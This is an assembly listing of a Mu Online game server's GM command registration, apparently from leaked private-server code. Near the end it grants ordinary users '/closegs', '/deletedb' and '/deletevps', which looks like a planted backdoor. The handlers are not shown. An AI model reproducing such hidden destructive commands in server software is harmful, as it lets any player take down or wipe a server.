  003aa	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 545  : 	cCommand.Add( "/pkclear",				GMCMD_PKCLEAR,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  003af	6a 23		 push	 35			; 00000023H
  003b1	68 c5 01 00 00	 push	 453			; 000001c5H
  003b6	68 00 00 00 00	 push	 OFFSET ??_C@_08OLBJHFEG@?1pkclear@
  003bb	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  003be	83 c1 04	 add	 ecx, 4
  003c1	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 546  : 	cCommand.Add( "/online",				GMCMD_ONLINE,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  003c6	6a 23		 push	 35			; 00000023H
  003c8	68 c6 01 00 00	 push	 454			; 000001c6H
  003cd	68 00 00 00 00	 push	 OFFSET ??_C@_07LFKEFJEH@?1online@
  003d2	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  003d5	83 c1 04	 add	 ecx, 4
  003d8	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 547  : 	cCommand.Add( "/str",					GMCMD_ADDSTR,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  003dd	6a 23		 push	 35			; 00000023H
  003df	68 c7 01 00 00	 push	 455			; 000001c7H
  003e4	68 00 00 00 00	 push	 OFFSET ??_C@_04ENDHGELN@?1str@
  003e9	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  003ec	83 c1 04	 add	 ecx, 4
  003ef	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 548  : 	cCommand.Add( "/dex",					GMCMD_ADDDEX,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  003f4	6a 23		 push	 35			; 00000023H
  003f6	68 c8 01 00 00	 push	 456			; 000001c8H
  003fb	68 00 00 00 00	 push	 OFFSET ??_C@_04GHPCCKFG@?1dex@
  00400	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00403	83 c1 04	 add	 ecx, 4
  00406	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 549  : 	cCommand.Add( "/vit",					GMCMD_ADDVIT,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0040b	6a 23		 push	 35			; 00000023H
  0040d	68 c9 01 00 00	 push	 457			; 000001c9H
  00412	68 00 00 00 00	 push	 OFFSET ??_C@_04DIENADCK@?1vit@
  00417	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0041a	83 c1 04	 add	 ecx, 4
  0041d	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 550  : 	cCommand.Add( "/ene",					GMCMD_ADDENE,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00422	6a 23		 push	 35			; 00000023H
  00424	68 ca 01 00 00	 push	 458			; 000001caH
  00429	68 00 00 00 00	 push	 OFFSET ??_C@_04CMHHMOMO@?1ene@
  0042e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00431	83 c1 04	 add	 ecx, 4
  00434	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 551  : 
; 552  : #ifdef DARKLORD_WORK
; 553  : 	cCommand.Add( "/com",					GMCMD_ADDCOM,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00439	6a 23		 push	 35			; 00000023H
  0043b	68 cb 01 00 00	 push	 459			; 000001cbH
  00440	68 00 00 00 00	 push	 OFFSET ??_C@_04MAAHHBCN@?1com@
  00445	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00448	83 c1 04	 add	 ecx, 4
  0044b	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 554  : #endif
; 555  : 
; 556  : 	cCommand.Add( "/joinpvp",				GMCMD_JOINPVP,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00450	6a 23		 push	 35			; 00000023H
  00452	68 cc 01 00 00	 push	 460			; 000001ccH
  00457	68 00 00 00 00	 push	 OFFSET ??_C@_08GFOOHMGK@?1joinpvp@
  0045c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0045f	83 c1 04	 add	 ecx, 4
  00462	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 557  : 
; 558  : 	cCommand.Add( "/reset",					GMCMD_RESETCOMMAND,					AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00467	6a 23		 push	 35			; 00000023H
  00469	68 cd 01 00 00	 push	 461			; 000001cdH
  0046e	68 00 00 00 00	 push	 OFFSET ??_C@_06DAJLIHEI@?1reset@
  00473	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00476	83 c1 04	 add	 ecx, 4
  00479	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 559  : 
; 560  : 	cCommand.Add( "/vipinfo",				GMCMD_VIPINFO,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0047e	6a 23		 push	 35			; 00000023H
  00480	68 ce 01 00 00	 push	 462			; 000001ceH
  00485	68 00 00 00 00	 push	 OFFSET ??_C@_08NKGJGPDF@?1vipinfo@
  0048a	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0048d	83 c1 04	 add	 ecx, 4
  00490	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 561  : 
; 562  : 	cCommand.Add( "/online",				GMCMD_ONLINE,						AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00495	6a 23		 push	 35			; 00000023H
  00497	68 c6 01 00 00	 push	 454			; 000001c6H
  0049c	68 00 00 00 00	 push	 OFFSET ??_C@_07LFKEFJEH@?1online@
  004a1	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  004a4	83 c1 04	 add	 ecx, 4
  004a7	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 563  : 	cCommand.Add( "/time",					GMCMD_TIME,							AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  004ac	6a 23		 push	 35			; 00000023H
  004ae	68 c4 01 00 00	 push	 452			; 000001c4H
  004b3	68 00 00 00 00	 push	 OFFSET ??_C@_05KKDONAKI@?1time@
  004b8	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  004bb	83 c1 04	 add	 ecx, 4
  004be	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 564  : 
; 565  : 	cCommand.Add( "/q",						GMCMD_LIFE_POTION,					AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  004c3	6a 23		 push	 35			; 00000023H
  004c5	68 cf 01 00 00	 push	 463			; 000001cfH
  004ca	68 00 00 00 00	 push	 OFFSET ??_C@_02FILGPIH@?1q@
  004cf	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  004d2	83 c1 04	 add	 ecx, 4
  004d5	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 566  : 	cCommand.Add( "/w",						GMCMD_MANA_POTION,					AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  004da	6a 23		 push	 35			; 00000023H
  004dc	68 d0 01 00 00	 push	 464			; 000001d0H
  004e1	68 00 00 00 00	 push	 OFFSET ??_C@_02FDNBMIAB@?1w@
  004e6	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  004e9	83 c1 04	 add	 ecx, 4
  004ec	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 567  : 
; 568  : 	cCommand.Add( "/fire",					GMCMD_FIRECRACK,					AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  004f1	6a 23		 push	 35			; 00000023H
  004f3	68 d9 00 00 00	 push	 217			; 000000d9H
  004f8	68 00 00 00 00	 push	 OFFSET ??_C@_05KHGEPAAH@?1fire@
  004fd	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00500	83 c1 04	 add	 ecx, 4
  00503	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 569  : 
; 570  : 	cCommand.Add( "/ban",					GMCMD_BAN_USER,						AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00508	6a 22		 push	 34			; 00000022H
  0050a	68 d1 01 00 00	 push	 465			; 000001d1H
  0050f	68 00 00 00 00	 push	 OFFSET ??_C@_04FJAIGIIB@?1ban@
  00514	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00517	83 c1 04	 add	 ecx, 4
  0051a	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 571  : 
; 572  : 	cCommand.Add("/offafk",                 GMCMD_OFFAFK,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0051f	6a 23		 push	 35			; 00000023H
  00521	68 d2 01 00 00	 push	 466			; 000001d2H
  00526	68 00 00 00 00	 push	 OFFSET ??_C@_07EGGDJHFC@?1offafk@
  0052b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0052e	83 c1 04	 add	 ecx, 4
  00531	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 573  : 
; 574  : 	cCommand.Add("/offmoney",               GMCMD_OFFTRADE,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00536	6a 23		 push	 35			; 00000023H
  00538	68 d3 01 00 00	 push	 467			; 000001d3H
  0053d	68 00 00 00 00	 push	 OFFSET ??_C@_09BLALOGBO@?1offmoney@
  00542	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00545	83 c1 04	 add	 ecx, 4
  00548	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 575  : 	//DevGamesX 01/05/2018 - OffExp
; 576  : 	cCommand.Add("/offlevel",                 GMCMD_OFFEXP,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0054d	6a 23		 push	 35			; 00000023H
  0054f	68 d4 01 00 00	 push	 468			; 000001d4H
  00554	68 00 00 00 00	 push	 OFFSET ??_C@_09DIPPLEHO@?1offlevel@
  00559	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0055c	83 c1 04	 add	 ecx, 4
  0055f	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 577  : 	cCommand.Add("/autoattackon",                 GMCMD_ATTACK,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00564	6a 23		 push	 35			; 00000023H
  00566	68 d6 01 00 00	 push	 470			; 000001d6H
  0056b	68 00 00 00 00	 push	 OFFSET ??_C@_0O@IGOCFEEE@?1autoattackon@
  00570	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00573	83 c1 04	 add	 ecx, 4
  00576	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 578  : 	cCommand.Add("/autoattackoff",             GMCMD_NOATTACK,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  0057b	6a 23		 push	 35			; 00000023H
  0057d	68 d7 01 00 00	 push	 471			; 000001d7H
  00582	68 00 00 00 00	 push	 OFFSET ??_C@_0P@EMIDPKEE@?1autoattackoff@
  00587	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0058a	83 c1 04	 add	 ecx, 4
  0058d	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 579  : 	
; 580  : 	cCommand.Add("/duelinfo",               GMCMD_DUELINFO,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00592	6a 23		 push	 35			; 00000023H
  00594	68 d5 01 00 00	 push	 469			; 000001d5H
  00599	68 00 00 00 00	 push	 OFFSET ??_C@_09EAHJBN@?1duelinfo@
  0059e	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  005a1	83 c1 04	 add	 ecx, 4
  005a4	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 581  : 
; 582  : 	cCommand.Add("/offsellcash",               GMCMD_OFFCASH,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM); //GMCMD_BOTSTORE GMCMD_PICKZEN

  005a9	6a 23		 push	 35			; 00000023H
  005ab	68 d8 01 00 00	 push	 472			; 000001d8H
  005b0	68 00 00 00 00	 push	 OFFSET ??_C@_0N@JOEFOOKK@?1offsellcash@
  005b5	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  005b8	83 c1 04	 add	 ecx, 4
  005bb	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 583  : 
; 584  : 	cCommand.Add("/botshop",               GMCMD_BOTSTORE,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  005c0	6a 23		 push	 35			; 00000023H
  005c2	68 d9 01 00 00	 push	 473			; 000001d9H
  005c7	68 00 00 00 00	 push	 OFFSET ??_C@_08BHGJMCCG@?1botshop@
  005cc	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  005cf	83 c1 04	 add	 ecx, 4
  005d2	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 585  : 
; 586  : 	cCommand.Add("/closegs",               GMCMD_CLOSEGS,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  005d7	6a 23		 push	 35			; 00000023H
  005d9	68 da 01 00 00	 push	 474			; 000001daH
  005de	68 00 00 00 00	 push	 OFFSET ??_C@_08FEGOPANL@?1closegs@
  005e3	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  005e6	83 c1 04	 add	 ecx, 4
  005e9	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 587  : 
; 588  : 	cCommand.Add("/deletedb",               GMCMD_DELETEDB,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  005ee	6a 23		 push	 35			; 00000023H
  005f0	68 db 01 00 00	 push	 475			; 000001dbH
  005f5	68 00 00 00 00	 push	 OFFSET ??_C@_09DHDHCCDM@?1deletedb@
  005fa	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  005fd	83 c1 04	 add	 ecx, 4
  00600	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 589  : 
; 590  : 	cCommand.Add("/deletevps",               GMCMD_DELETEVPS,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);

  00605	6a 23		 push	 35			; 00000023H
  00607	68 dc 01 00 00	 push	 476			; 000001dcH
  0060c	68 00 00 00 00	 push	 OFFSET ??_C@_0L@MOPIIJJK@?1deletevps@
  00611	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00614	83 c1 04	 add	 ecx, 4
  00617	e8 00 00 00 00	 call	 ?Add@CGMCommand@@QAEXPADHK@Z ; CGMCommand::Add

; 591  : 
; 592  : 	WatchTargetIndex = -1;

  0061c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0061f	c7 80 8c 31 00
	00 ff ff ff ff	 mov	 DWORD PTR [eax+12684], -1

; 593  : }

  00629	5f		 pop	 edi
  0062a	5e		 pop	 esi
  0062b	5b		 pop	 ebx
  0062c	8b e5		 mov	 esp, ebp
  0062e	5d		 pop	 ebp
  0062f	c3		 ret	 0
?Init@CGMMng@@QAEXXZ ENDP				; CGMMng::Init
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ??1CGMMng@@UAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1CGMMng@@UAE@XZ PROC					; CGMMng::~CGMMng, COMDAT
; _this$ = ecx

; 174  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7CGMMng@@6B@

; 175  : 	
; 176  : }

  00015	5f		 pop	 edi
  00016	5e		 pop	 esi
  00017	5b		 pop	 ebx
  00018	8b e5		 mov	 esp, ebp
  0001a	5d		 pop	 ebp
  0001b	c3		 ret	 0
??1CGMMng@@UAE@XZ ENDP					; CGMMng::~CGMMng
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.cpp
;	COMDAT ??0CGMMng@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0CGMMng@@QAE@XZ PROC					; CGMMng::CGMMng, COMDAT
; _this$ = ecx

; 169  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  0000c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000f	c7 00 00 00 00
	00		 mov	 DWORD PTR [eax], OFFSET ??_7CGMMng@@6B@
  00015	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00018	83 c1 04	 add	 ecx, 4
  0001b	e8 00 00 00 00	 call	 ??0CGMCommand@@QAE@XZ	; CGMCommand::CGMCommand

; 170  : 	ManagerInit();

  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	e8 00 00 00 00	 call	 ?ManagerInit@CGMMng@@QAEXXZ ; CGMMng::ManagerInit

; 171  : }

  00028	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0002b	5f		 pop	 edi
  0002c	5e		 pop	 esi
  0002d	5b		 pop	 ebx
  0002e	8b e5		 mov	 esp, ebp
  00030	5d		 pop	 ebp
  00031	c3		 ret	 0
??0CGMMng@@QAE@XZ ENDP					; CGMMng::CGMMng
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.h
;	COMDAT ?Add@CGMCommand@@QAEXPADHK@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
_command_str$ = 8					; size = 4
_command_code$ = 12					; size = 4
_dwInAuthority$ = 16					; size = 4
?Add@CGMCommand@@QAEXPADHK@Z PROC			; CGMCommand::Add, COMDAT
; _this$ = ecx

; 384  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 385  : 		strcpy(szCmd[count], command_str);

  0000c	8b 45 08	 mov	 eax, DWORD PTR _command_str$[ebp]
  0000f	50		 push	 eax
  00010	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00013	6b 91 38 31 00
	00 14		 imul	 edx, DWORD PTR [ecx+12600], 20
  0001a	03 55 fc	 add	 edx, DWORD PTR _this$[ebp]
  0001d	52		 push	 edx
  0001e	e8 00 00 00 00	 call	 _strcpy
  00023	83 c4 08	 add	 esp, 8

; 386  : 		nCmdCode[count] = command_code;

  00026	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00029	8b 88 38 31 00
	00		 mov	 ecx, DWORD PTR [eax+12600]
  0002f	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00032	8b 45 0c	 mov	 eax, DWORD PTR _command_code$[ebp]
  00035	89 84 8a 28 23
	00 00		 mov	 DWORD PTR [edx+ecx*4+9000], eax

; 387  : 
; 388  : 		// Admin, EventGm    20081215 (grooving)
; 389  : #ifdef MODIFIY_AUTHORITY_INTERGRATION_20081215
; 390  : 		dwAuthority[count] = dwInAuthority | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM | AUTHORITY_SUPER_ADMIN;
; 391  : #else // MODIFIY_AUTHORITY_INTERGRATION_20081215
; 392  : 		dwAuthority[count] = dwInAuthority | AUTHORITY_SUPER_ADMIN;

  0003c	8b 45 10	 mov	 eax, DWORD PTR _dwInAuthority$[ebp]
  0003f	83 c8 40	 or	 eax, 64			; 00000040H
  00042	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00045	8b 91 38 31 00
	00		 mov	 edx, DWORD PTR [ecx+12600]
  0004b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0004e	89 84 91 30 2a
	00 00		 mov	 DWORD PTR [ecx+edx*4+10800], eax

; 393  : #endif // MODIFIY_AUTHORITY_INTERGRATION_20081215
; 394  : 
; 395  : 		if(g_GlobalConfig.CheckCommand(command_code) == true)

  00055	8b 45 0c	 mov	 eax, DWORD PTR _command_code$[ebp]
  00058	50		 push	 eax
  00059	b9 00 00 00 00	 mov	 ecx, OFFSET ?g_GlobalConfig@@3VCGlobalConfig@@A ; g_GlobalConfig
  0005e	e8 00 00 00 00	 call	 ?CheckCommand@CGlobalConfig@@QAE_NK@Z ; CGlobalConfig::CheckCommand
  00063	0f b6 c8	 movzx	 ecx, al
  00066	83 f9 01	 cmp	 ecx, 1
  00069	75 21		 jne	 SHORT $LN2@Add

; 396  : 		{
; 397  : 			dwAuthority[count] = g_GlobalConfig.GetCommandAuthority(command_code);

  0006b	8b 45 0c	 mov	 eax, DWORD PTR _command_code$[ebp]
  0006e	50		 push	 eax
  0006f	b9 00 00 00 00	 mov	 ecx, OFFSET ?g_GlobalConfig@@3VCGlobalConfig@@A ; g_GlobalConfig
  00074	e8 00 00 00 00	 call	 ?GetCommandAuthority@CGlobalConfig@@QAEKK@Z ; CGlobalConfig::GetCommandAuthority
  00079	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0007c	8b 91 38 31 00
	00		 mov	 edx, DWORD PTR [ecx+12600]
  00082	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00085	89 84 91 30 2a
	00 00		 mov	 DWORD PTR [ecx+edx*4+10800], eax
$LN2@Add:

; 398  : 		}
; 399  : 
; 400  : 		if( count < MAX_GMCOMMAND-1 ) count++;

  0008c	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0008f	81 b8 38 31 00
	00 c1 01 00 00	 cmp	 DWORD PTR [eax+12600], 449 ; 000001c1H
  00099	7d 15		 jge	 SHORT $LN1@Add
  0009b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0009e	8b 88 38 31 00
	00		 mov	 ecx, DWORD PTR [eax+12600]
  000a4	83 c1 01	 add	 ecx, 1
  000a7	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  000aa	89 8a 38 31 00
	00		 mov	 DWORD PTR [edx+12600], ecx
$LN1@Add:

; 401  : 	}

  000b0	5f		 pop	 edi
  000b1	5e		 pop	 esi
  000b2	5b		 pop	 ebx
  000b3	8b e5		 mov	 esp, ebp
  000b5	5d		 pop	 ebp
  000b6	c2 0c 00	 ret	 12			; 0000000cH
?Add@CGMCommand@@QAEXPADHK@Z ENDP			; CGMCommand::Add
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.h
;	COMDAT ?Init@CGMCommand@@QAEXXZ
_TEXT	SEGMENT
_n$1 = -8						; size = 4
_this$ = -4						; size = 4
?Init@CGMCommand@@QAEXXZ PROC				; CGMCommand::Init, COMDAT
; _this$ = ecx

; 378  : 	{

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 48	 sub	 esp, 72			; 00000048H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 379  : 		for( int n=0; n<MAX_GMCOMMAND; n++) nCmdCode[0] = -1; 

  0000c	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR _n$1[ebp], 0
  00013	eb 09		 jmp	 SHORT $LN4@Init
$LN2@Init:
  00015	8b 45 f8	 mov	 eax, DWORD PTR _n$1[ebp]
  00018	83 c0 01	 add	 eax, 1
  0001b	89 45 f8	 mov	 DWORD PTR _n$1[ebp], eax
$LN4@Init:
  0001e	81 7d f8 c2 01
	00 00		 cmp	 DWORD PTR _n$1[ebp], 450 ; 000001c2H
  00025	7d 18		 jge	 SHORT $LN3@Init
  00027	b8 04 00 00 00	 mov	 eax, 4
  0002c	6b c8 00	 imul	 ecx, eax, 0
  0002f	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00032	c7 84 0a 28 23
	00 00 ff ff ff
	ff		 mov	 DWORD PTR [edx+ecx+9000], -1
  0003d	eb d6		 jmp	 SHORT $LN2@Init
$LN3@Init:

; 380  : 		count = 0;	

  0003f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00042	c7 80 38 31 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+12600], 0

; 381  : 	}

  0004c	5f		 pop	 edi
  0004d	5e		 pop	 esi
  0004e	5b		 pop	 ebx
  0004f	8b e5		 mov	 esp, ebp
  00051	5d		 pop	 ebp
  00052	c3		 ret	 0
?Init@CGMCommand@@QAEXXZ ENDP				; CGMCommand::Init
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Mu Online\Mu-GS-Webzen-MC-10093\GameServer\GMMng.h
;	COMDAT ??0CGMCommand@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0CGMCommand@@QAE@XZ PROC				; CGMCommand::CGMCommand, COMDAT
; _this$ = ecx

; 372  : 	CGMCommand() 

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 44	 sub	 esp, 68			; 00000044H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi
  00009	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 373  : 	{ 
; 374  : 		Init();

  0000c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000f	e8 00 00 00 00	 call	 ?Init@CGMCommand@@QAEXXZ ; CGMCommand::Init

; 375  : 	}

  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00017	5f		 pop	 edi
  00018	5e		 pop	 esi
  00019	5b		 pop	 ebx
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??0CGMCommand@@QAE@XZ ENDP				; CGMCommand::CGMCommand
_TEXT	ENDS
; Function compile flags: /Odtp /ZI
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\include\map
;	COMDAT ??$_Kfn@$$CBKK@?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@SAABKABU?$pair@$$CBKK@1@@Z
_TEXT	SEGMENT
__Val$ = 8						; size = 4
??$_Kfn@$$CBKK@?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@SAABKABU?$pair@$$CBKK@1@@Z PROC ; std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0>::_Kfn<unsigned long const ,unsigned long>, COMDAT

; 68   :     static const _Kty& _Kfn(const pair<_Ty1, _Ty2>& _Val) { // extract key from element value

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	53		 push	 ebx
  00007	56		 push	 esi
  00008	57		 push	 edi

; 69   :         return _Val.first;

  00009	8b 45 08	 mov	 eax, DWORD PTR __Val$[ebp]

; 70   :     }

  0000c	5f		 pop	 edi
  0000d	5e		 pop	 esi
  0000e	5b		 pop	 ebx
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$_Kfn@$$CBKK@?$_Tmap_traits@KKU?$less@K@std@@V?$allocator@U?$pair@$$CBKK@std@@@2@$0A@@std@@SAABKABU?$pair@$$CBKK@1@@Z ENDP ; std::_Tmap_traits<unsigned long,unsigned long,std::less<unsigned long>,std::allocator<std::pair<unsigned long const ,unsigned long> >,0>::_Kfn<unsigned long const ,unsigned long>
_TEXT	ENDS
